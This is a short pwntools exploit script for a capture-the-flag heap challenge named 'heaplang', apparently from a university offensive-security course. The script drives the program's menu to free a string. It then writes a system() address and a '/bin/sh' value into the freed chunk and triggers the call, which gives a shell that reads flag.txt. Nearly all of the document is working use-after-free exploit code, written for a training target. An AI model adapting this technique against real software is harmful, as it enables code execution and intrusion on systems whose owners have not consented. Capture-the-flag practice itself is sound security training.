#!/usr/bin/python
from pwn import *

debug = True
p = ""
if debug:
    p = process("./heaplang")
    prog = ELF("heaplang")
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1345)
    p.recvuntil(": ")
    p.sendline("krm504")
    p.recvline()
    pause(1)

p.recvuntil("Starting up...")
print("Waiting for timer..")

p.recvuntil("> ")
p.sendline("1")
p.recvuntil("?\n")
p.sendline("1")
p.recvuntil("?\n")
p.sendline("16")
p.recvuntil("?\n")
p.sendline("cat flag.txt")
if debug:
    print("String made")

p.recvuntil("> ")
p.sendline("4")
p.recvuntil("?\n")
p.sendline("0")
if debug:
    print("String deleted")

p.recvuntil("> ")
p.sendline("1")
p.recvline()
p.sendline("0")
p.recvline()
p.sendline(str(0x4006e0))
if debug:
    print("System call placed")

p.recvuntil("> ")
p.sendline("1")
p.recvline()
p.sendline("0")
p.recvline()
p.sendline(str(0x0068732f6e69622f))
if debug:
    print("'/bin/sh' placed")

p.recvuntil("> ")
p.sendline("3")
p.recvline()
p.sendline("0")
if debug:
    print("Gettin' shell")

pause(1)
if debug:
    p.interactive()
else:
    p.sendline("cat flag.txt")
    p.recvuntil("flag{")
    print("flag{" + p.recvuntil('}'))
